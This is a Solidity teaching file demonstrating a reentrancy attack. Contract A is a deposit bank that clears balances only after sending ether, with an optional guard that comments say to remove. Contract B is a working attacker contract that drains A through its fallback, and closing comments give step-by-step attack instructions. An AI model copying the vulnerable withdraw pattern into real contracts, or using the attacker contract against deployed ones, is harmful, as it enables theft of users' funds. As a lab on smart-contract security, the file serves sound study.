// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;


// Some confusions regarding require check it later
contract A {
    bool internal locked;
    event Log(uint256 balance);

    mapping(address => uint256) public balances;


    //comment the below function to implement reentrancy attack M-II
    //M-II is Reentrancy Guard
    modifier nonReentrant() {
        require(!locked, "No re-entrancy"); // 
        locked = true;
        _;
        locked = false;
    }





    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 bal = balances[msg.sender];
       // balances[msg.sender] = 0; //M-I to prevent reentrant attack 
        emit Log(bal);
        require(bal > 0, "hii");
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "hii2");
         balances[msg.sender]=0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract B {
    A public a; // if in separate file need to import

    constructor(address _address) {
        a = A(_address);
    }

    fallback() external payable {
        if (address(a).balance >= 1 ether) {
            a.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        a.deposit{value: 1 ether}(); // in this way use can send msg.value via different sc
        a.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

//step no 1 - deploy A smart contract
//step no 2- copy address of deployed A SC
//step no 3- deploy B smart contract using address of A SC
//step no 4- deposit 5 ether from 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2 to SC
//step no 5- deposit 5 ether from 0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db
//step no 6- attack A from 0x78731D3Ca6b7E34aC0F824c42a7cC18A495cabaB by depositing 1 ether
